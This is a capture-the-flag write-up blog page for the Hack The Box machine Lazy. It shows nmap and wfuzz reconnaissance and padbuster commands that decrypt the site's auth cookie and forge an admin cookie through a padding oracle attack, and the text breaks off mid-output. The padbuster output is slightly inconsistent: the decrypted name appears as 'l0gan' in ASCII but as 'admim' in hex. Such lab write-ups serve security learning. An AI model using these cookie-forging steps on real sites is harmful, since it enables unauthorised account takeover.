@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB: Lazy :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Lazy - Write Up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/lazy/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB: Lazy">
+<meta property="og:description" content="**HTB | Lazy - Write Up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/lazy/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Lazy.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-19 21:44:55 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/lazy/">HTB: Lazy</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-19
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/padding_oracle_attack/">padding_oracle_attack</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/bit_flipper_attack/">bit_flipper_attack</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/path_hijacking/">path_hijacking</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Lazy.png"
+    class="post-cover"
+    alt="HTB: Lazy"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Lazy</strong> is an old but really good Hack the Box machine.</p>
+<p>It&rsquo;s main challenge is the inspection of a cookie wich leads us to execute attacks that will get us the admin&rsquo;s cookie.</p>
+<p>We can do this with both a <strong>Bit Flipper Attack and a Padding Oracle Attack</strong>.</p>
+<p>There&rsquo;s also another way to get to admin which is extremely easy that I will also show you.</p>
+<p>And lastly for root we will abuse a SUID binary vulnerable to a path hijacking attack.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Nmap finds two open ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.69.240 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked up and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-19 21:51 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 21:51
+</span></span><span style="display:flex;"><span>Scanning 10.129.69.240 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.129.69.240
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.129.69.240
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 21:52, 20.82s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.69.240
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">55458</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">10075</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 20.99 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">102817</span> <span style="color:#f92672">(</span>4.524MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">62785</span> <span style="color:#f92672">(</span>2.511MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>These are two very commmon ports so let&rsquo;s inspect them further:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p22,80 10.129.69.240 -oN targeted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-19 21:56 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.69.240
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.17s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.7 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: CompanyDev
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.7 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.19 seconds
+</span></span></code></pre></div><p>We don&rsquo;t have creds for SSH so let&rsquo;s take a look to the webserver:</p>
+
+  <img src="/img/laz1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We can register but still it doesn&rsquo;t seem like we have anything interesting going on here.</p>
+<p>Let&rsquo;s fuzz for routes and PHP files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.69.240/FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.129.69.240/FUZZ
+</span></span><span style="display:flex;"><span>Total requests: 220547
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000003:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W       <span style="color:#ae81ff">314</span> Ch      <span style="color:#e6db74">&#34;images&#34;</span>
+</span></span><span style="display:flex;"><span>000000537:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W       <span style="color:#ae81ff">311</span> Ch      <span style="color:#e6db74">&#34;css&#34;</span>
+</span></span><span style="display:flex;"><span>000001415:   <span style="color:#ae81ff">301</span>        <span style="color:#ae81ff">9</span> L      <span style="color:#ae81ff">28</span> W       <span style="color:#ae81ff">315</span> Ch      <span style="color:#e6db74">&#34;classes&#34;</span>
+</span></span><span style="display:flex;"><span>000045227:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">41</span> L     <span style="color:#ae81ff">77</span> W       <span style="color:#ae81ff">1117</span> Ch     <span style="color:#e6db74">&#34;http://10.129.69.240/&#34;</span>
+</span></span><span style="display:flex;"><span>000095511:   <span style="color:#ae81ff">403</span>        <span style="color:#ae81ff">10</span> L     <span style="color:#ae81ff">30</span> W       <span style="color:#ae81ff">293</span> Ch      <span style="color:#e6db74">&#34;server-status&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>❯ wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.69.240/FUZZ.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.129.69.240/FUZZ.php
+</span></span><span style="display:flex;"><span>Total requests: 220547
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000040:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">58</span> L     <span style="color:#ae81ff">97</span> W       <span style="color:#ae81ff">1548</span> Ch     <span style="color:#e6db74">&#34;login&#34;</span>
+</span></span><span style="display:flex;"><span>000000002:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">41</span> L     <span style="color:#ae81ff">77</span> W       <span style="color:#ae81ff">1117</span> Ch     <span style="color:#e6db74">&#34;index&#34;</span>
+</span></span><span style="display:flex;"><span>000000052:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">60</span> L     <span style="color:#ae81ff">95</span> W       <span style="color:#ae81ff">1592</span> Ch     <span style="color:#e6db74">&#34;register&#34;</span>
+</span></span><span style="display:flex;"><span>000000320:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">7</span> L      <span style="color:#ae81ff">4</span> W        <span style="color:#ae81ff">51</span> Ch       <span style="color:#e6db74">&#34;footer&#34;</span>
+</span></span><span style="display:flex;"><span>000001212:   <span style="color:#ae81ff">302</span>        <span style="color:#ae81ff">22</span> L     <span style="color:#ae81ff">41</span> W       <span style="color:#ae81ff">734</span> Ch      <span style="color:#e6db74">&#34;logout&#34;</span>
+</span></span><span style="display:flex;"><span>000000178:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">22</span> L     <span style="color:#ae81ff">41</span> W       <span style="color:#ae81ff">734</span> Ch      <span style="color:#e6db74">&#34;header&#34;</span>
+</span></span></code></pre></div><p>Nothing interesting so let&rsquo;s move on.</p>
+<p>After we register we get assigned a cookie:</p>
+
+  <img src="/img/laz2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It has a unusual looking structure, which leads me to think about a block-encrypted data. Which is far more insecure than a JWT for example.</p>
+<h1 id="first-method-padding-oracle-attack">First method: Padding Oracle Attack<a href="#first-method-padding-oracle-attack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>If we intercept a request with Burp and change the cookie we see this:</p>
+
+  <img src="/img/laz3.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>&ldquo;Invalid padding&rdquo; is a very interesting output, since there&rsquo;s an attack related to block-encrypted data called &ldquo;Paddle Oracle Attack&rdquo;.</p>
+<p>Which will decrypt our cookie and build a new one for another user, for example, admin.</p>
+<p>With <strong>padbuster</strong> we can exploit this but it will take some time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ padbuster http://10.129.69.240 <span style="color:#e6db74">&#39;LAD9iExwuveRJRxijHcszNjIbiL9zTHA&#39;</span> <span style="color:#ae81ff">8</span> --cookies <span style="color:#e6db74">&#39;auth=LAD9iExwuveRJRxijHcszNjIbiL9zTHA&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>+-------------------------------------------+
+</span></span><span style="display:flex;"><span>| PadBuster - v0.3.3                        |
+</span></span><span style="display:flex;"><span>| Brian Holyfield - Gotham Digital Science  |
+</span></span><span style="display:flex;"><span>| labs@gdssecurity.com                      |
+</span></span><span style="display:flex;"><span>+-------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO: The original request returned the following
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status: <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Location: N/A
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Content Length: <span style="color:#ae81ff">979</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO: Starting PadBuster Decrypt Mode
+</span></span><span style="display:flex;"><span>*** Starting Block <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">2</span> ***
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO: No error string was provided...starting response analysis
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*** Response Analysis Complete ***
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The following response signatures were returned:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>ID#	Freq	Status	Length	Location
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>1	1	200	1133	N/A
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> **	255	200	15	N/A
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter an ID that matches the error condition
+</span></span><span style="display:flex;"><span>NOTE: The ID# marked with ** is recommended : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Continuing test with selection <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>101/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>36/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 7<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>238/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>139/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>1/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>98/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>140/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>175/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 1<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Block <span style="color:#ae81ff">1</span> Results:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cipher Text <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: 91251c628c772ccc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Intermediate Bytes <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: 597398fa7111de9a
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Plain Text: user<span style="color:#f92672">=</span>l0g
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Use of uninitialized value $plainTextBytes in concatenation <span style="color:#f92672">(</span>.<span style="color:#f92672">)</span> or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 1.
+</span></span><span style="display:flex;"><span>*** Starting Block <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">2</span> ***
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>53/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>216/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 7<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>142/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>114/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>159/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>228/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>177/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>16/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 1<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Block <span style="color:#ae81ff">2</span> Results:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cipher Text <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: d8c86e22fdcd31c0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Intermediate Bytes <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: f8481a648a712aca
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Plain Text: im
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>** Finished ***
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypted value <span style="color:#f92672">(</span>ASCII<span style="color:#f92672">)</span>: user<span style="color:#f92672">=</span>l0gan
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypted value <span style="color:#f92672">(</span>HEX<span style="color:#f92672">)</span>: 757365723D61646D696D060606060606
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Decrypted value <span style="color:#f92672">(</span>Base64<span style="color:#f92672">)</span>: dXNlcj1hZG1pbQYGBgYGBg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span></code></pre></div><p>Now we know that the cookie structure is <em>user=name</em>, now we can find the cookie for <em>user=admin</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ padbuster http://10.129.69.240 <span style="color:#e6db74">&#39;LAD9iExwuveRJRxijHcszNjIbiL9zTHA&#39;</span> <span style="color:#ae81ff">8</span> --cookies <span style="color:#e6db74">&#39;auth=LAD9iExwuveRJRxijHcszNjIbiL9zTHA&#39;</span> -plaintext <span style="color:#e6db74">&#34;user=admin&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>+-------------------------------------------+
+</span></span><span style="display:flex;"><span>| PadBuster - v0.3.3                        |
+</span></span><span style="display:flex;"><span>| Brian Holyfield - Gotham Digital Science  |
+</span></span><span style="display:flex;"><span>| labs@gdssecurity.com                      |
+</span></span><span style="display:flex;"><span>+-------------------------------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO: The original request returned the following
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status: <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Location: N/A
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Content Length: <span style="color:#ae81ff">979</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO: Starting PadBuster Encrypt Mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Number of Blocks: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INFO: No error string was provided...starting response analysis
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*** Response Analysis Complete ***
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The following response signatures were returned:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>ID#	Freq	Status	Length	Location
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>1	1	200	1133	N/A
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> **	255	200	15	N/A
+</span></span><span style="display:flex;"><span>-------------------------------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter an ID that matches the error condition
+</span></span><span style="display:flex;"><span>NOTE: The ID# marked with ** is recommended : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Continuing test with selection <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>196/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>148/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 7<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>92/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>41/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>218/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>136/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success: <span style="color:#f92672">(</span>150/256<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Byte 2<span style="color:#f92672">]</span>
